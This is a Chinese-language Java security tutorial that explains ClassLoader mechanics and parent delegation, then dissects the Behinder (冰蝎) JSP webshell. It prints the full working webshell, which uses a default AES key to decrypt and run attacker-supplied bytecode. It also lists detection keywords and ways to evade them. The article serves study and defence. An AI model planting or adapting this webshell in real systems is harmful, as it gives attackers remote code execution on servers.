![](https://image.3001.net/images/20220307/1646631307_6225998bc815a97e973f6.jpg!small)

## **前言**

告别脚本小子系列是本公众号的一个集代码审计、安全研究和漏洞复现的专题，意在帮助大家更深入的理解漏洞原理和掌握漏洞挖掘的思路和技巧。系列课程包含多篇文章，往期课程和后续规划目录如下。如果你对下面的某些内容感兴趣，可以点击关注。

##  **目录**

1\. Java本地调试和远程调试技巧

2\. Java反编译技巧

3\. Java安全基础概念之反射与ClassLoader

 **4. ClassLoader机制与冰蝎Webshell分析**

5\. Java反序列化基础

6\. CommonCollections利用链分析介绍上

7\. CommonCollections利用链分析介绍下

8\. JNDI注入原理与fastjson漏洞实践

9\. Weblogic反序列化漏洞分析

10\. Java命令回显技术研究

11\. Java内存马技术研究

12\. RASP技术研究

13\. 基于CodeQL的自动化代码审计技术研究上

14\. 基于CodeQL的自动化代码审计技术研究下

……

##  **0x01 概念**

从之前的课程中我们已经知道Java代码运行的过程是从字节码到JVM，由JVM来最终对JAVA代码进行执行，整个过程如图1.1所示。

![](https://image.3001.net/images/20220307/1646631391_622599df162cb15f6c4d6.png!small)

图1.1 JAVA代码执行过程

整个JAVA代码执行过程中很关键的一步是从JAVA字节码到JVM虚拟机，这个过程就称为类加载过程，简称ClassLoader。任何一个JAVA类必须经过ClassLoader加载之后，才能被调用和执行。对于一般的JAVA开发人员来说并不太关心ClassLoader类加载机制，但是ClassLoader是学习java安全中的一个极重要的概念，ClassLoader为攻击者提供了一种执行任意java代码的途径，有点类似于PHP中的eval。当然ClassLoader的用法要比eval复杂很多。

##  **0x02 ClassLoader介绍**

JDK自带的ClassLoader有三个，分别是BootstrapClassLoader、ExtClassLoader和AppClassLoader。查看类加载器可以通过Class对象的getClassLoader函数实现。三者之间存在父子关系，BootstrapClassLoader加载器是ExtClassLoader的父加载器，ExtClassLoader加载器是AppClassLoader加载器的父加载器。

###  **2.1 BootstrapClassLoader**

BootstrapClassLoader：引导类加载器，属于最顶层的类加载器，主要用于加载java的核心库，包括rt.jar、resources.jar等。引导类加载器加载的都是jdk原生携带的核心库，通过C/C++语言实现，引导类加载器的实现逻辑是JVM的一部分，不能通过java代码控制引导类加载器的行为。![](https://image.3001.net/images/20220307/1646631475_62259a33dbac24a8a9de9.png!small)

图2.1 LdapName类对应的加载器是引导类加载器

究竟有哪些类的加载器是属于引导类加载器呢？有一种通过查看全局属性的方式可以获取引导类加载器加载的类对应的路径，如图2.2所示。System.getProperty("sun.boot.class.path")![](https://image.3001.net/images/20220307/1646631526_62259a66ed9e1e2fa81ca.png!small)

图2.2 引导类加载器对应的类路径

笔者曾经有一个想法是这样的，已知RMI协议在客户端和服务端之间是通过序列化和反序列化的方式来传递数据的，网上的公开资料也可以查到关于RMI反序列化漏洞的利用方式，[参考链接](https://xz.aliyun.com/t/6660)。但是这种反序列化利用方式有一个很大的前提是必须绑定一个函数，接受的参数类型是Object，这样就大大增加了RMI反序列化利用的局限性。有没有一种可能是在RMI协议协商过程中通过修改交互的序列化内容达到无限制的反序列化利用？相关的过程比较复杂，如果有机会，可以再开一篇文章详细分析整个过程。这里只抛出结论，那就是不可以。我们要修改RMI协议交互过程中序列化数据包（把正常的序列化数据包，替换为恶意的序列化数据），就必须要修改RMI协议的实现类，但是RMI的实现类和ldap一样，对应的类加载器是引导类加载器BootstrapClassLoader。  
**BootstrapClassLoader只能加载java、javax和sun开头的类，而目前为止还没有任何一条反序列化利用链是只用到了java、javax和sun开头的类，我们修改的RMI实现类中引入的其他类（比如反序列化常用的CommonCollections类）都不会生效。**
可能有的读者会觉得我们要实现RMI协议又不是一定要用JAVA远程的类，只要知道了协议原理，我们完全可以用python模拟实现RMI客户端，这样就可以实现发送恶意的序列化数据的效果。这样的想法确实客户端是实现了发送恶意序列化数据的效果，但是服务端接收到数据进行反序列化的时候是一定用原生代码的，这时候引导类加载器就不会再加载恶意类了。这应该是一个JAVA的安全机制问题，不允许任意修改引导类加载器加载的类，引导类加载器只能加载java、javax和sun开头的类。

###  **2.2 ExtClassLoader**

ExtClassLoader：扩展类加载器，一般属于JDK自带的一些非核心功能实现类。ExtClassLoader是由java代码实现的，可以被其他java程序调用。以类jdk.internal.dynalink.beans.BeansLinker为例来查看对应的加载器，如图2.3所示。

![](https://image.3001.net/images/20220307/1646631573_62259a9537ab8aa9990de.png!small)

图2.3 BeansLinker类的加载器是ExtClassLoader

与引导类加载器类似，扩展类加载器加载的类路径也保存在系统属性中，可以直接通过查看对应属性的方式查看扩展类加载器加载的类路径。System.getProperty("java.ext.dirs")![](https://image.3001.net/images/20220307/1646631602_62259ab2e55fbeb0b1079.png!small)

图2.4扩展类加载对应的类路径

###  **2.3 AppClassLoader**

AppClassLoader：应用类加载器。应用类加载器是java应用中最常见的加载器，在java项目中自己编写的java类和引入的第三方类都由应用类加载器加载到JVM中。以类com.sun.deploy.uitoolkit.PluginUIToolKit类为例查看对应的加载器，如图2.5所示。![](https://image.3001.net/images/20220307/1646631634_62259ad2d3a97c034cf29.png!small)

图2.5 PluginUIToolKit类的加载器是AppClassLoader

应用类加载器会加载当前应用classpath中的所有类，也可以通过读取系统属性值来查看应用类加载器对应的加载路径。System.getProperty("java.class.path")

![](https://image.3001.net/images/20220307/1646631665_62259af178bb5e75d6380.png!small)图2.6
应用类加载器对应的类路径

##  **0x03 ClassLoader原理**

如果是细心的小伙伴就会发现图2.6和图2.2中有部分类有重合，也就是说一个类既被引导类加载器加载，又被应用类加载器加载。那么这种被两个类都加载的类怎么算呢？以哪个类加载器为标准，还是会在内存加载两次？

###  **3.1 双亲委派模型**

要搞清楚这个问题，就要先学习ClassLoader的双亲委派机制。这里借用网上一张存在的图来说明，如图3.1所示。![](https://image.3001.net/images/20220307/1646631721_62259b29d825ae5b56791.png!small)

图3.1 类加载中的双亲委派机制

以一句话来总结双亲委派模型就是“总是优先把加载类的任务交给父加载器”。例如，如果要加载一个类com.util.xxx，那么加载顺序应该是这样的：

> 1\.
> 首先看自定义的加载器（如果没有自定义加载器，则直接到步骤2）中是否已经加载了类com.util.xxx，如果已经加载过，就直接返回，否则交给AppClassLoader。
>
> 2\. 查看AppClassLoader是否已经加载了com.util.xxx，如果已经加载过，就直接返回，否则交给ExtClassLoader。
>
> 3\.
> 查找ExtClassLoader是否已经加载了com.util.xxx，如果已经加载过，就直接返回，否则交给BootstrapClassLoader。
>
>
> 4.查找BootstrapClassLoader是否已经加载了com.util.xxx，如果已经加载过，就直接返回，否则从BootstrapClassLoader的加载路径中查找是否存在目标类。如果BootstrapClassLoader没有找到目标类，则交给ExtClassLoader。
>
> 5\.
> 从ExtClassLoader的加载路径中查找是否存在目标类，如果ExtClassLoader没有找到目标类，则交给AppClassLoader。
>
> 6\.
> 从AppClassLoader的加载路径中查找是否存在目标类，如果AppClassLoader没有找到目标类，则交给自定义ClassLoader。
>
> 7\. 从自定义ClassLoader对应的路径查找是否存在目标类，如果自定义ClassLoader没有找到目标类，则抛出异常。

从上面的过程可以看出，整个类的加载过程中总是优先使用父类加载器进行加载，如果父类加载器找到了目标类，就直接返回结果。那么我们再来回答一下本小节开头提出的问题，如果AppClassLoader加载器和BootstrapClassLoader加载器都可以加载某个类，JVM会优先选择通过BootstrapClassLoader加载器来加载目标类，内存中也不会保留两份目标类的加载对象。

###  **3.2 源码解析**

所有的ClassLoader的实现类都必须继承java.lang.ClassLoader类，这个类是加载器的共同基类。这里有一点需要注意的是java.lang.ClassLoader类是抽象类，所以不能被直接使用，但是这个类里面没有抽象方法，所以只要是继承自java.lang.ClassLoader类的类可以不覆盖重写任意方法。如图3.2所示。![](https://image.3001.net/images/20220307/1646631761_62259b51aa0dcc35099e9.png!small)

图3.2 ClassLoader类不能被直接使用

在ClassLoader类中，有三个方法对于理解类加载器原理特别重要。分别是loadClass、findClass和defineClass。  
 **1） loadClass方法**  
loadClass方法的作用是通过指定的类全限定名加载类。从字面意思来理解就是实现类加载器的功能。从loadClass的源码中也能很清晰地看出双亲委派模型的实现逻辑，如图3.3所示。![](https://image.3001.net/images/20220307/1646631804_62259b7cf3a3ac8e5ec04.png!small)

图3.3 loadClass源码解析

  
关于loadClass方法中的关键步骤笔者已经标注在上面的图中，可以看出java.lang.ClassLoader类的loadClass类就是实现双亲委派模型的关键步骤。如果说父加载器并没有返回目标类的信息，则调用findClass方法继续查找目标类。这里说明一下，此函数末尾有一个resolveClass函数，实际上此函数并没有什么实际用处，因为默认情况下resolve为false，不会执行对应的代码。  
 **2） findClass方法**

findClass方法的作用也是基于类的全限定名来查找对应的目标类，但是查阅findClass的源码却发现JDK并没有对此方法进行实现，java.lang.ClassLoader类中的findClass方法定义如图3.4所示。

![](https://image.3001.net/images/20220307/1646631906_62259be225875fed4cf0e.png!small)

图3.4 findClass源码解析

可能有的读者就觉得很疑惑，为什么会有一个留空的方法存在？而且这个方法还是最重要的方法之一？其实这个方法是JDK故意留下给自定义ClassLoader继承并覆盖重写的方法，如果需要实现自定义ClassLoader，最标准的做法就是继承java.lang.ClassLoader类并重写findClass方法（为什么不建议重新loadClass方法，因为这样就会破坏双亲委派模型）。如果要看findClass的标准实现方式，就只能通过java.lang.ClassLoader类的继承类来查看。笔者这里选择一个典型的继承类URLClassLoader来了解一般findClass方法的实现，如图3.5所示。![](https://image.3001.net/images/20220307/1646631938_62259c02870d96e207edc.png!small)

图3.5 findClass源码解析

从这里我们可以看出，findClass最终会调用defineClass来把目标字节码加载到JVM中。  
 **3） defineClass方法**  
defineClass是最终真正把字节码转化为可调用执行的类的方法，defineClass返回的是类对应的Class对象（关于Class对象的使用方法，请参考第三课中反射的相关知识）。defineClass的实现方式如图3.6所示。![](https://image.3001.net/images/20220307/1646631981_62259c2d7a31b89577a6b.png!small)

图3.6 defineClass源码解析

defineClass的具体实现逻辑比较复杂，这涉及到很多较低层的知识，我们并不关心具体怎么实现的。但是有一点必须要清楚的是，defineClass是真正把字节码转化为Class对象的方法。

##  **0x04 冰蝎Webshell分析**

冰蝎是目前最流行的一种webshell，由于对请求包和相应包都经过了AES加密，所以监测难度极大，也深受攻击者喜爱。从网上下载最典型的冰蝎webshell，格式化之后如下所示。

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> 

### **1） 第一部分是导入需要的包**

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>

java.util.* ，这个是java默认的基础包。主要提供了需要用到的HashMap这些类。javax.crypto.*,
这主要提供了用于AES加密和解密需要的包javax.crypto.spec.*, 主要用于提供AES解密需要的密钥

###  
 **2） 自定义ClassLoader，执行指定的class字节码**

    
    
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);//调用父类的defineClass方法}}%>

在3.2章节中我们提到过自定义ClassLoader的标准写法是重写findClass方法，但是冰蝎的作者是直接重写的defineClass方法，这样写从原理上来说是完全可以的，但是这样写会破坏ClassLoader的双亲委派模型（对于冰蝎来说，这完全不重要，没有双亲委派模型反而可以没有约束的加载自己的字节码）。默认ClassLoader中的defineClass函数是protected的，必须要重写才能直接调用。冰蝎自定义ClassLoader最核心就是把definedClass方法重写为方法g。

###  **3） 解密用户传入的数据**

    
    
    if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k); //把密钥保存在session中Cipher c=Cipher.getInstance("AES");//引入AES加解密算法c.init(2,new SecretKeySpec(k.getBytes(),"AES"));

k就是冰蝎的连接密钥，也就是数据包中的加密密钥。

1\. 把密钥保存在session中，主要是为了方便后面动态传入的class字节码执行的时候也能获取到对应的密钥。

2\. 冰蝎AES加密/解密的密钥也就是连接的密钥。所以新版的冰蝎已经没有密钥协商的过程了。

###  **4） 解密并执行传入的字节码**

    
    
    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);

这段代码还是不好看，继续格式化，方便阅读。

    
    
    String d1 = request.getReader().readLine(); //获取传递过来的POST请求体byte[] d2 = new sun.misc.BASE64Decoder().decodeBuffer(d1); //对请求体进行base64解码byte[] d3 = c.doFinal(d2); //使用上一步的密钥对请求体进行AES解密，获取字节码new U(this.getClass().getClassLoader()).g(d3).newInstance().equals(pageContext); //通过自定义的ClassLoader对字节码进行执行

其他步骤都很好理解，对最后一步进行说明

1\. newInstance()方法主要是调用字节码类的无参构造函数创建对应类的对象，详细可以参考java反射的概念。

2\. 通过生成的类对象调用equals方法，并且传参为pageContext（pageContext是jsp中的页面输出类对象）

###  **5） 传输字节流分析**

上面已经说清楚了冰蝎执行的整个过程，但是为了更加清晰的理解冰蝎传递的字节码究竟是什么样的，我们抓一个包，解密之后来看字节码的明文数据。把解密之后的变量d3保存到文件req.class。![](https://image.3001.net/images/20220307/1646632172_62259cecd5b8fa7fe7871.png!small)

图4.1 记录保存冰蝎字节码

重放任意一个冰蝎的数据包，可以看到req.class文件已经生成了。反编译该class文件，对应的内容大致如下。

    
    
    ……public class Echo {public static String content;private ServletRequest Request;private ServletResponse Response;private HttpSession Session;public Echo() {}public boolean equals(Object obj) {PageContext page = (PageContext)obj;this.Session = page.getSession();this.Response = page.getResponse();this.Request = page.getRequest();page.getResponse().setCharacterEncoding("UTF-8");HashMap result = new HashMap();boolean var12 = false;...try {so = this.Response.getOutputStream();so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));so.flush();so.close();page.getOut().clear();} catch (Exception var15) {var15.printStackTrace();}return true;}...}

这段代码最核心的是恶意的equals函数，从中可以看出系统恶意的代码流程。

###  **6） equals方法的反思**

equals方法一般用于对两个类进行比较，熟悉java开发的人对这个方法应该不会陌生。但是在冰蝎的逻辑里面，确实把equals方法作为恶意代码的执行方法，有没有其他的方法可以替代equals呢？通过反射的newInstance方法创建的对象属于Object,
Object类支持的方法如图4.2所示。从列表中可以看出Object类中只有equals方法支持传入Object类型的参数，所以默认情况下就只能用equals方法，没有其他方法可以替代。![](https://image.3001.net/images/20220307/1646632207_62259d0fece97f1fe1903.png!small)

图4.2 Object类支持的方法列表

Object类虽然只有equals方法接受Object类型参数，但是其他还有很多类是支持Objectl类型参数的。但是这样就必须要对反射生成的对象进行强制类型转换（向下转型）。

###  **7） 冰蝎关键字提取**

对于冰蝎的webshell来说，有一些关键字是实现冰蝎所必须的。总结如下表所示。

 **关键字**|  **是否必须**|  **原因**  
---|---|---  
ClassLoader| 否| webshell一定要继承ClassLoader,但是也可以继承ClassLoader的子类，子类不一定有这个特征  
defineClass| 是| 要把字节码转化为Class对象，一定要使用这个方法  
newInstance| 是| 通过Class对象生成Object对象，反射创建对象必须使用的方法  
equals| 否| 在上面已经分析过了，也可以调用其他接收Object类型参数的方法，只是需要类型转换  
request| 是| 接收外部传输的数据一定需要  
  
当然这里列举的一些关键字只是从webshell的实现逻辑来分析，不考虑一般绕过技巧，不能直接作为WAF防御的依据，例如：

> 1\. 还有一些关键字class、return、extends这些也是必须的；
>
> 可以通过ScriptEngine来隐藏上面的关键字；
>
> 2\. defineClass也可以通过反射的方式实现，不是必须出现此关键字；

针对如何对冰蝎等webshell进行检测和防护绕过，后续会输出专项文章进行分析，大家可以持续关注。

 **参考链接**

<https://blog.csdn.net/briblue/article/details/54973413><https://xz.aliyun.com/t/6660>

 **相关阅读**

[告别脚本小子系列丨JAVA安全(1)——JAVA本地调试和远程调试技巧](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483768&idx=1&sn=36ff6d279fa7dbd7d5ae00b06a3c3ddc&chksm=c2a1d5f1f5d65ce701e1f73ce0f584412bfc38a507622758f2acabce370cdcc4bb4af2270045&token=1637952127&lang=zh_CN&scene=21#wechat_redirect)

[告别脚本小子系列丨JAVA安全(2)——JAVA反编译技巧](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483803&idx=1&sn=1af141cd5623b2682cfbdc2c12a53309&chksm=c2a1d512f5d65c04bc046ee83de4ba98881d086837f05cef581b39323026195b504bb5635c4c&token=1637952127&lang=zh_CN&scene=21#wechat_redirect)

[告别脚本小子系列丨JAVA安全(3)——JAVA反射机制﻿](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483830&idx=1&sn=39c08c61cbab36ace4ac691e0756948b&chksm=c2a1d53ff5d65c29f9b8310c324c67568fe27e61720baffff8af19ef9cb94f5096d73df0c69f&token=1637952127&lang=zh_CN&scene=21#wechat_redirect)

